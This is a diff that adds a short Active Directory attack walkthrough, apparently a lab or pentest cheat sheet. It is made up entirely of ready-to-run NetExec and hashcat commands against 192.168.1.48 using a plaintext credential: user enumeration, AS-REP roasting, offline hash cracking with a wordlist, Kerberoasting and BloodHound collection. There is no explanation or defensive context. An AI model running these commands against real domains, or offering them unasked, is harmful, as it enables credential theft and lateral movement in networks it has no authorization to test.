@@ -1,0 +1,16 @@
+# AD Attack Walkthrough
+
+## Step 1: User Enumeration
+nxc ldap 192.168.1.48 -u raj -p Password@1 --users
+
+## Step 2: ASREPRoast
+nxc ldap 192.168.1.48 -u users.txt -p '' --asreproast hashes.txt
+
+## Step 3: Crack Hashes
+hashcat -m 18200 hashes.txt rockyou.txt
+
+## Step 4: Kerberoast
+nxc ldap 192.168.1.48 -u raj -p Password@1 --kerberoasting hash.txt
+
+## Step 5: BloodHound
+nxc ldap 192.168.1.48 -u raj -p Password@1 --bloodhound --collection All
